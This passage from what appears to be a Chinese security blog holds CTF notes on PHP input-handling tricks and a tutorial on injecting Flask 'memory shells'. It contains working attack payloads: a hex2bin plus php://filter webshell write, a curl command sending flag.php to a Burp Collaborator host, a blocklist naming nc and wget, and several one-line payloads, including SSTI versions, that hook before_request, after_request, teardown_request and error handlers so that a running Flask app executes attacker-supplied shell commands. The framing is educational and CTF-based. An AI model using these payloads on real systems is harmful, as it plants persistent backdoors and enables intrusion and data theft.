class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>我们仔细观察会发现只要有<code>GET</code>传值<code>$_GET</code>的值就会被赋值为<code>&amp;$_POST</code>也就是<code>$_GET</code>变成了<code>$_POST</code><br>而最终highlight_file函数里只要<code>$_GET[&#39;HTTP_FLAG&#39;]</code>为flag就可以回显flag即<br>payload就是随便GET传个值再POST传值HTTP_FLAG=flag</p>
<h1 id="做题时遇到的一些小盲点-是真的小"><a href="#做题时遇到的一些小盲点-是真的小" class="headerlink" title="做题时遇到的一些小盲点(是真的小)"></a>做题时遇到的一些小盲点(是真的小)</h1><h2 id="回调函数利用类里的方法"><a href="#回调函数利用类里的方法" class="headerlink" title="回调函数利用类里的方法"></a>回调函数利用类里的方法</h2><p>回调函数像call_user_func是可以调用类里的方法的如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">   <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure><br>我们可以利用回调函数来调用getflag函数。调用方法如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func(C::getFlag)</span><br></pre></td></tr></table></figure><br><a href="https://www.php.net/manual/zh/function.call-user-func.php">php手册</a><br>还可以尝试数组的方法来调用<br>可以向a以数组的方法传入两个值如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a[<span class="number">0</span>]=C&amp;a[<span class="number">1</span>]=getFlag</span><br></pre></td></tr></table></figure><br>即向上面那样会变成<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(C,getFlag));</span><br></pre></td></tr></table></figure><br>导致getFlag被调用</p>
<h2 id="POST和GET传值遇到parse-str的变量覆盖"><a href="#POST和GET传值遇到parse-str的变量覆盖" class="headerlink" title="POST和GET传值遇到parse_str的变量覆盖"></a>POST和GET传值遇到parse_str的变量覆盖</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;3&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;3&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>像上面的几行代码，可以发现要使key1和key2都为3且不能直接向变量传值。<br>我们先看两句解析变量的代码。先是解析请求字符，在解析全局变量<code>$_POST</code>这就会存在一个变量覆盖，我们可以传值为<code>?_POST[key1]=3&amp;_POST[key2]=3</code>那么经过函数解析这就会变成<code>$_POST[key1]=3</code>和<code>$_POST[key2]=3</code>在经过extract函数就会使得key1和key2被赋值。</p>
<h2 id="赋值和逻辑判断"><a href="#赋值和逻辑判断" class="headerlink" title="赋值和逻辑判断"></a>赋值和逻辑判断</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br></pre></td></tr></table></figure>
<p>像上式我直接将<code>$vo</code>想当然的认为是逻辑判断后的结果，其实不是，该语句是先赋值后进行逻辑判断。所以<code>$V0</code>的值其实就是<code>is_numeric($v1)</code>的值</p>
<h2 id="php非法变量名"><a href="#php非法变量名" class="headerlink" title="php非法变量名"></a>php非法变量名</h2><p>在我们进行post和get传值是能将一些非法的变量名传入的。但是对于这些php也会自动处理，会将非法的变量名删除有下划线替代等。<br><code>$_POST[&#39;CTF_SHOW.COM&#39;]</code>如上面的。如果正常使用POST传CTF<em>SHOW.COM是无法传入的因为.会被删除或转换，但是这种转换是只有一次的即当有两个非法字符时只有前一个会被转换或删除。而在一些版本里<code>[</code>会被转换成</em>那么我们就可以使用将POST中的<em>改成<code>[</code>来使得后面的.保留从而成功转换。如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTF[SHOW.COM=lll</span><br></pre></td></tr></table></figure><br><code>[</code>会被转换成</em>从而正常给变量传值，</p>
<h1 id="一些题目"><a href="#一些题目" class="headerlink" title="一些题目"></a>一些题目</h1><h2 id="反射类"><a href="#反射类" class="headerlink" title="反射类"></a>反射类</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一题需要使用反射类ReflectionClass<br>new ReflectionClass($class) 可以获得类的反射对象（包含元数据信息）。</p>
<p>元数据对象（包含class的所有属性/方法的元数据信息）<br>所以这题的paylaod为<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=111&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure></p>
<h2 id="回调函数使用hex2bin将数字构造成字符串，进行文件伪协议写入。"><a href="#回调函数使用hex2bin将数字构造成字符串，进行文件伪协议写入。" class="headerlink" title="回调函数使用hex2bin将数字构造成字符串，进行文件伪协议写入。"></a>回调函数使用hex2bin将数字构造成字符串，进行文件伪协议写入。</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正常看到这题我们会尝试写入一句化木马，我们可以使用16进制数尝试绕过is_numeric再通过回调函数使用hex2bin函数将数组转化成一句化木马，再将v3赋值为1.php写入一句话木马。但是不知道是不是由于版本的原因is_numeric函数无法识别16进制。<br>我们只能使用科学计数法来构造&lt;?=`cat *`;。这里使用了短标签和反引号进行命令执行</p>
<p>5044383959474e6864434171594473经过hex2bin函数变为&lt;?=`cat *`;的base64编码。我们在通过伪协议来讲base64码解码后写入文件也就是给v3传值php://filter/write=convert.base64-decode/resource=1.php<br>payload<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br><span class="line">------</span><br><span class="line">POST</span><br><span class="line">v1=hex2bin</span><br></pre></td></tr></table></figure><br>最后打开1.php即可。</p>
<h2 id="0c绕过"><a href="#0c绕过" class="headerlink" title="%0c绕过"></a>%0c绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($num)&#123;</span><br><span class="line">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class="line">    return $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[&#x27;num&#x27;];</span><br><span class="line">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class="line">    if($num==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题我们会发现其由于waf导致我们无法使用小数来进行绕过这时我们可以使用%0c来进行绕过,%0c是不可见字符,在php中%0c36==36那么这就导致了我们可以使用%0c来进行绕过.</p>
<h2 id="ctfshow-web入门-133"><a href="#ctfshow-web入门-133" class="headerlink" title="ctfshow web入门 133"></a>ctfshow web入门 133</h2><p>这题我认为是比较有价值记录的<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>首先我们可以看到其只能继续6个字符的rce。<br><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a><br>这篇文章讲了这题的两种方法<br>重点是我们要使用<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`;+sleep 3</span><br></pre></td></tr></table></figure><br>上面的payload会成功执行sleep。那么这是为什么呢?<br>我们都知道`是内敛执行的返回即shell_exec()的缩写。<br>原因是<code>$F</code>就是<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`$F`;+sleep 3</span><br></pre></td></tr></table></figure><br>这就会导致一个变量的嵌套使得该语句一个是<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">``$F`;+sleep`</span><br></pre></td></tr></table></figure><br>即在主机会执行上面的代码，导致后面的语句执行成功。<br>那么我们就有了几种思路。反弹shell，dnslog外带，和使用curl来讲flag.php带出。</p>
<h3 id="curl讲flag-php带出"><a href="#curl讲flag-php带出" class="headerlink" title="curl讲flag.php带出"></a>curl讲flag.php带出</h3><p>curl -F 将flag文件上传到Burp的 Collaborator Client （ Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies）<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#其中-F 为带文件的形式发送post请求</span><br><span class="line">#xx是上传文件的name值，flag.php就是上传的文件 </span><br><span class="line">?F=`$F`;+curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>我看文章是可以dns带出的但是我不知道为什么只能带出ls的结果cat flag带不出</p>
]]></content>
      <categories>
        <category>php</category>
        <category>特性</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>python无回显下的命令执行</title>
    <url>/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="关于python命令执行不出网无回显的情况下主要分为两种情况，开启debug未开启debug"><a href="#关于python命令执行不出网无回显的情况下主要分为两种情况，开启debug未开启debug" class="headerlink" title="关于python命令执行不出网无回显的情况下主要分为两种情况，开启debug未开启debug"></a>关于python命令执行不出网无回显的情况下主要分为两种情况，开启debug未开启debug</h1><h1 id="开启debug"><a href="#开启debug" class="headerlink" title="开启debug"></a>开启debug</h1><p>使用<code>exec(&quot;raise%20Exception(__import__(%27os%27).popen(%27whoami%27).read())&quot;)</code>来进行报错输出命令执行结果</p>
<h1 id="未开启debug"><a href="#未开启debug" class="headerlink" title="未开启debug"></a>未开启debug</h1><h2 id="add-url-route"><a href="#add-url-route" class="headerlink" title="add_url_route"></a>add_url_route</h2><p>在老版本的flask在进行请求后仍然是可以通过add<em>url<em>route来添加路由的，但是新版本对其进行了修改导致其无法注入内存马，但是老版本还是可以使用的<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].add_url_rule(<span class="string">&#x27;/shell&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;shell&#x27;</span>)).read())</span><br></pre></td></tr></table></figure><br>通过`sys.modules[‘<strong>main</strong>‘].__dict</em></em>[‘app’]<code>获取该flask下的app。而后调用add_url_rule。</code>def add_url_rule(self,rule: str,endpoint: str | None = None,view_func: ft.RouteCallable | None = None,provide_automatic_options: bool | None = None,**options: t.Any,)`<br>我们使用的内存马的三个参数第一个是路由，第二个是端点，第三个就是利用了lambda来定义一个匿名函数。此函数作为该路由的视图函数，这样只要使用eval或exec来执行如上命令，就可以创建一个命令执行的路由。</p>
<h2 id="利用钩子函数"><a href="#利用钩子函数" class="headerlink" title="利用钩子函数"></a>利用钩子函数</h2><h3 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h3><p>before_request 这个方法可以让我们在每次请求时执行运行操作。<br><img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png" class="" title="alt text"><br>步入这个函数可以发现如下代码<br><img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png" class="" title="alt text"><br>可以发现其实我们定义的识图函数就是传入的f，那么我们就可以通过<code>app.before_request_funcs.setdefault(None, []).append(lambda a:xxxxx)</code>通过传入匿名函数来进行在每次请求时都执行这个匿名函数，那么这个匿名函数为后门时就会成功在每次请求前都命令执行<br>payload如下<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].before_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;shell&#x27;</span>)).read())</span><br></pre></td></tr></table></figure><br>我们还可以使用if语句来对内存马进行改造让其看的更舒服<br><img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png" class="" title="alt text"><br>但是使用如上payload会导致正常业务逻辑出现问题，<img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png" class="" title="alt text"><br>因为这是在请求前就运行了这个函数，导致响应被提前返回这就导致了业务逻辑出现错误。这就需要下面的after_request函数来进行不影响业务逻辑的内存马注入。</p>
<h3 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp:<span class="built_in">__import__</span>(<span class="string">&#x27;flask&#x27;</span>).make_response(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;shell&#x27;</span>)).read()))</span><br></pre></td></tr></table></figure>
<p>after_request和前面一个类似,只是该函数是每个请求后运行一次这个函数，且视图函数的参数就是response对象。那么我们只要奖上面的payload进行改造然其在未输入shell参数时返回我们的response即可让业务逻辑正常进行如下<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp:<span class="built_in">__import__</span>(<span class="string">&#x27;flask&#x27;</span>).make_response(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;shell&#x27;</span>)).read())<span class="keyword">if</span> request.args.get(<span class="string">&#x27;shell&#x27;</span>) <span class="keyword">else</span> resp)</span><br></pre></td></tr></table></figure><br>还可以在判断语句中加request.path.startswith(“/shell”)来规定在什么路由下才会返回命令执行的内容如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp:<span class="built_in">__import__</span>(<span class="string">&#x27;flask&#x27;</span>).make_response(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;shell&#x27;</span>)).read())<span class="keyword">if</span> request.args.get(<span class="string">&#x27;shell&#x27;</span>) <span class="keyword">and</span> request.path.startswith(<span class="string">&#x27;/shell&#x27;</span>) <span class="keyword">else</span> resp)</span><br></pre></td></tr></table></figure>
<h3 id="teardown-request"><a href="#teardown-request" class="headerlink" title="teardown_request"></a>teardown_request</h3><p>teardown_request的底层函数调用和前面的很相似<br><img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5.png" class="" title="alt text"><br>那么我们只要奖前面的进行更改即可<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].teardown_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp:<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;shell&#x27;</span>)).read())</span><br></pre></td></tr></table></figure><br>但是其仍然无回显，即其无法达到我们进行无回显命令执行的效果，其比较大的作用可能就是进行命令执行的bypass<br><img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/6.png" class="" title="alt text"></p>
<h3 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h3><p>errorhandler在一些用户设定的状态码下运行函数，如404，500<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_error</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;aaa&quot;</span></span><br></pre></td></tr></table></figure><br><img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/10.png" class="" title="alt text"><br>如上在404是就会触发handle_error函数</p>
<img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/7.png" class="" title="alt text">
<img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/8.png" class="" title="alt text">
<p>步入其函数会发现其底层为<code>self._get_exc_class_and_code(code_or_exception)</code>和<code>self.error_handler_spec[None][code][exc_class] = f</code> code_or_exception就是触发的响应状态码，f就是函数。<br>那么我们就可以写出payload了<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">exc_class, code = <span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]._get_exc_class_and_code(<span class="number">404</span>);<span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].error_handler_spec[<span class="literal">None</span>][code][exc_class] = <span class="keyword">lambda</span> err: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;shell&#x27;</span>)).read()</span><br></pre></td></tr></table></figure><br>上面的代码因为是多行代码所以无法使用eval来运行只能使用exec来运行。</p>
<h1 id="与SSTI中的使用"><a href="#与SSTI中的使用" class="headerlink" title="与SSTI中的使用"></a>与SSTI中的使用</h1><h2 id="before-request-1"><a href="#before-request-1" class="headerlink" title="before_request"></a>before_request</h2><p>在SSTI中我们上述payload中的request等都是不能直接使用都是需要导入的,即如下<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda: __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;shell&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><br>利用flask的内置函数url<em>for来得到eval进而执行命令，而request还需要通过`{‘request’:url<em>for.__globals</em></em>[‘request’]}`来将其定义为flask中的request</p>
<h2 id="after-request-1"><a href="#after-request-1" class="headerlink" title="after_request"></a>after_request</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp:__import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;shell&#x27;)).read())if request.args.get(&#x27;shell&#x27;) else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>after_request也相似</p>
<h2 id="teardown-request-1"><a href="#teardown-request-1" class="headerlink" title="teardown_request"></a>teardown_request</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[<span class="string">&quot;exec&quot;</span>](<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda resp:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;shell&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>]&#125;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="errorhandler-1"><a href="#errorhandler-1" class="headerlink" title="errorhandler"></a>errorhandler</h2><p>这个同样<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[&quot;exec&quot;](&quot;exc_class, code = __import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]._get_exc_class_and_code(404);__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].error_handler_spec[None][code][exc_class] = lambda err: __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;shell&#x27;)).read()&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><br>只是需要更改一些命令执行的函数为exec<br>这个的内存马我还看到了有的师傅使用了global来奖code和exc_class定义为全局变量，但是在实验中发现其实并不需要但是我还是给一下这个payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[&quot;exec&quot;](&quot;global exc_class;global code;exc_class, code = __import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]._get_exc_class_and_code(404);__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].error_handler_spec[None][code][exc_class] = lambda err: __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;shell&#x27;)).read()&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
